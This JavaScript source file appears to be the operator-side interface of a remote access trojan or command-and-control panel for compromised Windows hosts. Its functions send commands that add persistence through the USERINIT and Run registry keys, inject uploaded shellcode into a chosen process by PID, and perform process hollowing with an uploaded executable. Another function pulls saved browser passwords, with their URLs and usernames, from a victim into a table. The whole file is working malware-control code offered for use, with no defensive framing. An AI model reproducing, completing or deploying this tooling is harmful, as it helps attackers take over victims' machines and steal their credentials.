import { Loading } from './Loader.js';

export class PersistenceOption{
    constructor(id){
        this.id = id;
        this.actions = {
            "USERINIT": "wininit",
            "Run (Local User)": "runlocaluser",
            "Run (Local Machine)": "runlocalmachine"
        }
    }

    async sendPersist(name, action) {
        const response = await fetch("/command/option/sendpersistence", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({message:{command: "e5fcfe07178a109ea0c1e9bd7e9dd772",name:name, action:action}, id: this.id})
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        return data.message;
    }

    action(event){
        const element = event.target;
        console.log(element);
        action = element.textContent.trim();
        const name = "winup"
        // sendPersist("winup", action)
        // .then(data => {
        //     // Do something with data
        // });
    }
}

export function InjectOption(e, id){
    e.preventDefault();
    toggleAll("");
    fetch('/ProcessTableIndex')
      .then(response => response.text())
      .then(html => {
        const modal = document.createElement('div');
        modal.innerHTML = html;
        modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
        modal.id = "ProcessMainTable"
        document.body.appendChild(modal);
  
        FetchProcesess(id).then(data => {
          console.log(data);
          let tbody = document.querySelector('#ProcessesToinject tbody');
          if (tbody) {
            while (tbody.firstChild) {
              tbody.removeChild(tbody.firstChild);
            }
          }        
          for(let i of data){  
            console.log(i.length)  
  
            let row = document.createElement('tr');
            row.innerHTML = `
              <td class="ProcessNameInjectoption">${i[0]}</td>
              <td class="PidInjectoption">${i[1]}</td>
              <td class="Memoryusegoption">${i[2]}</td>
              <td class="OwnerInjectoption">${i[3]}</td>
            `;
  
            let td = document.createElement('td');
            td.className = "WasInjectoption";
            let icon = document.createElement('i');
            icon.className = "fa-solid fa-microchip";
            td.appendChild(icon);
  
            if (i[4] == "y"){
              icon.style.color = '#0f0';
            } else {
              icon.addEventListener('click', function() {
                SendInjectByPid(i[1],icon, id);
              });
            }
  
            row.appendChild(td);
            tbody.appendChild(row);
          }
        });
      })
      .catch(error => console.error('Error:', error));
  }




export function SendInjectShellCodeLocal(getFileMethod, id){
    const loader = new Loading();
    getFileMethod().then(shellonbase => {
        loader.DisplayLoading()
    return fetch("/send_message", {
        method: "POST",
        headers: {
        "Content-Type": "application/json"
        },
        body: JSON.stringify({message:{command: "2dbab3bcba2fe64f1d2133bc50796496",shellonbase:shellonbase}, id: id})
    })
    .then(response => {
        if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(res => {
        console.log(res)
        loader.EndLoading()
        displayResult(res.message)
    })
    });
}



export function PasswordOption(e, id, web){
    e.preventDefault();
    toggleAll("");
    fetch('/passwordsTableIndex')
        .then(response => response.text())
        .then(html => {
        const modal = document.createElement('div');
        modal.innerHTML = html;
        modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
        modal.id = "PasswordMainTable"
        document.body.appendChild(modal);
        
        FetchPasswords(id, web).then(data => {
            let profileSelection = document.querySelector('#profile-selection');
            for(let profile in data){
                let option = document.createElement('option');
                option.text = profile;
                option.value = profile;
                profileSelection.add(option);
            }

            profileSelection.addEventListener('change', function() {
            let selectedProfile = this.value;
            let profileData = data[selectedProfile];
            let tbody = document.querySelector('#profileTable tbody');
            while (tbody.firstChild) {
                tbody.removeChild(tbody.firstChild);
            }
            profileData.forEach(function(record) {
                if (record.password.length > 0 || record.user.length > 0){
                    tbody.insertAdjacentHTML('beforeend', `<tr>
                        <td class="url">${record.url}</td>
                        <td class="created">${record.created}</td>
                        <td class="last">${record.last}</td>
                        <td class="user">${record.user}</td>
                        <td class="password">${record.password}</td>
                        </tr>`
                    );
                }
            });
            });

            profileSelection.dispatchEvent(new Event('change'));
        });
        })
        .catch(error => console.error('Error:', error));
}


function FetchPasswords(id, web){
    const loader = new Loading()
    loader.DisplayLoading()
    return fetch("/send_message", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({message:{command: "5df297c2f2da83a8b45cfd012fbf9b3c",type:"Passwords",web:web}, id: id})
    })
    .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then(res => {
      loader.EndLoading()
      return res.message;
    })
    .catch(error => {
      console.error('An error occurred while fetching passwords:', error);
    });
  }
  
function FetchProcesess(id){
    const loader = new Loading()
    loader.DisplayLoading()
    return fetch("/send_message", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({message:{command: "be425fd08e9ea24230bac47493228ada"}, id: id})
    })
    .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response.json();
    })
    .then(res => {
      loader.EndLoading()
      return res.message;
    })
    .catch(error => {
      console.error('An error occurred while fetching passwords:', error);
    });
}
  
  
 
function FetchFilesHollowing(id,path="default"){
  const loader = new Loading()
  loader.DisplayLoading()
  return fetch("/send_message", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({message:{command: "ce52e112fb976b2d277f09b6eada379f", path:path}, id: id})
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(res => {
    loader.EndLoading()
    return res.message;
  })
  .catch(error => {
    console.error('An error occurred while fetching files:', error);
  });
}


export function UploadProcessToInject() {
    return new Promise((resolve, reject) => {
      let mainDiv = document.getElementById("UploadFileDialogBox");
      mainDiv.style.display = 'block';
      let container = document.querySelector('.UploadFileContainer');
      let fileList = document.getElementById('SelectedFileName');
      let fileUpload = document.getElementById('file_uploadOption');
  
      function updateFileList() {
          let files = fileUpload.files;
          if (files.length > 0) {
              fileList.textContent = files[files.length - 1].name;
          }
      }
  
      fileUpload.addEventListener('change', updateFileList);
  
      container.addEventListener('dragover', function(e) {
        e.preventDefault();
        container.classList.add('dragover');
      });
  
      container.addEventListener('dragleave', function(e) {
        e.preventDefault();
        container.classList.remove('dragover');
      });
  
      container.addEventListener('drop', function(e) {
        e.preventDefault();
        container.classList.remove('dragover');
        fileUpload.files = e.dataTransfer.files;
        updateFileList();
      });
  
      document.querySelector('.UploadFileBtn').addEventListener('click', function() {
        let files = fileUpload.files;
        if (files.length === 0) {
            console.log("No files selected");
            return;
        }
        mainDiv.style.display = 'none'
        let file = files[0];
        let reader = new FileReader();
  
        reader.onload = function(event) {
            let base64String = event.target.result.split(',')[1];
            console.log(base64String);
            resolve(base64String); 
        };
  
        reader.onerror = function(event) {
            console.log("Error reading file: " + event.target.error);
            reject(event.target.error); 
        };
  
        reader.readAsDataURL(file);
      });
    });
}

function SendInjectByPid(pid,icon,id){
    UploadProcessToInject().then(shellonbase => {
        return fetch("/send_message", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({message:{command: "aea87b24517d08c8ff13601406a0202e",shellonbase:shellonbase, targetPid:pid}, id: id})
        })
        .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
        })
        .then(res => {
        if(res.message){
            icon.style.color = '#0f0';
        }
        else{
            icon.style.color = 'red';
        }
        })
    });
}



function displayResult(condition) {
    let existingDiv = document.getElementById('result');
    if (existingDiv) existingDiv.remove();
    
    const divElement = document.createElement('div');
    divElement.id = 'result';
    
    if (condition) {
        divElement.innerHTML = '<i class="far fa-check-circle check"></i>';
    } else {
        divElement.innerHTML = '<i class="fa-regular fa-circle-xmark failuer"></i>';
    }
    
    divElement.style.position = 'fixed';
    divElement.style.top = '50%';
    divElement.style.left = '50%';
    divElement.style.transform = 'translate(-50%, -50%)';
    
    document.body.appendChild(divElement);
    
    setTimeout(function() {
        document.body.removeChild(divElement);
    }, 2800);
}

function toggleAll(exclude){
    const array = ["ChatContainer","settings-menu","UploadFileDialogBox"];
    array.forEach(element => {
      if (element != exclude){
        let el = document.getElementById(element);
        if(el) {
          el.style.display = 'none';
        }
      }
    });
  }






// File Exp Process hollowing

export class HollowingOptionHandler {
  constructor(id, initialPath = "default") {
      this.id = id;
      this.path = initialPath;
      this.modal = null;
      this.folderSelection = null;
      this.tbody = null;
      this.MainPath = null
  }

  initialize() {
      this.fetchModalHtml()
          .then(html => this.createModal(html))
          .then(() => this.updateContentForPath(this.path))
          .catch(error => console.error('Error:', error));
  }

  fetchModalHtml() {
      return fetch('/processhollowing').then(response => response.text());
  }

  createModal(html) {
      this.modal = document.createElement('div');
      this.modal.innerHTML = html;
      this.modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
      this.modal.id = "ProcessMainTable"
      document.body.appendChild(this.modal);
      this.folderSelection = document.querySelector('#folderhollowexpInput');
      this.folderDataList = document.querySelector('#folderhollowexpSelection');
      this.tbody = document.querySelector('#ProcessesToinject tbody');
      this.folderSelection.addEventListener('change', (e) => {
        if(e.target.value.length >= 2){
          this.path = e.target.value;
          this.updateContentForPath(this.path);
        }
    });    
  }

  updateContentForPath(path) {
      FetchFilesHollowing(this.id, path)
          .then(data => this.handleData(data))
          .catch(error => console.error('Error:', error));
  }

  handleData(data) {
      this.populateFolderSelection(data['Folders']['DirectoriesArr']);
      this.populateTable(data['Files']);
      this.MainPath = data['MainPath'];
      this.folderSelection.placeholder = this.MainPath;
  }

  populateFolderSelection(directories) {
    this.folderDataList.innerHTML = ""; 
    for(let i of directories){
        let option = document.createElement('option');
        option.value = i;
        this.folderDataList.appendChild(option);
    }
  }


  populateTable(files) {
      while (this.tbody.firstChild) {
          this.tbody.removeChild(this.tbody.firstChild);
      }
      for (let i of files) {
          let row = this.createRow(i);
          this.tbody.appendChild(row);
      }
  }

  createRow(file) {
    let row = document.createElement('tr');

    let tdName = document.createElement('td');
    tdName.className = "FilesNameInjectoption";

    let img = document.createElement('img');
    img.src = 'data:image/png;base64,' + file.icon;
    img.style = "width: 30px; height: 30px;";
    tdName.appendChild(img);

    let pname = document.createElement('p');
    let nameText = document.createTextNode(file.name);
    pname.appendChild(nameText);

    tdName.appendChild(pname);
    row.appendChild(tdName);

    let tdSize = document.createElement('td');
    tdSize.className = "PidInjectoption";
    tdSize.textContent = file.size;
    row.appendChild(tdSize);

    let tdLastTimeUpdate = document.createElement('td');
    tdLastTimeUpdate.className = "Memoryusegoption";
    tdLastTimeUpdate.textContent = file.lastTimeUpdate;
    row.appendChild(tdLastTimeUpdate);

    let tdCreationTime = document.createElement('td');
    tdCreationTime.className = "OwnerInjectoption";
    tdCreationTime.textContent = file.creationTime;
    row.appendChild(tdCreationTime);

    let td = document.createElement('td');
    td.className = "WasInjectoption";
    let icon = document.createElement('i');
    icon.className = "fa-solid fa-microchip";
    td.appendChild(icon);
    icon.addEventListener('click', function() {
      this.SendInjectByFile(file.name, icon, this.id);
    }.bind(this));

    row.appendChild(td);

    return row;
  }

  SendInjectByFile(file, icon, id){
    UploadProcessToInject().then( exeonbase => {
        return fetch("/send_message", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({message:{command: "b11c081208b1d6466c83e37098510d73", exeonbase:exeonbase, file:file, path:this.MainPath}, id: id})
        })
        .then(response => {
          return response.json();
        })
        .then(res => {
        if(res.message){
            icon.style.color = '#0f0';
        }
        else{
            icon.style.color = 'red';
        }
        })
    });
  }
}
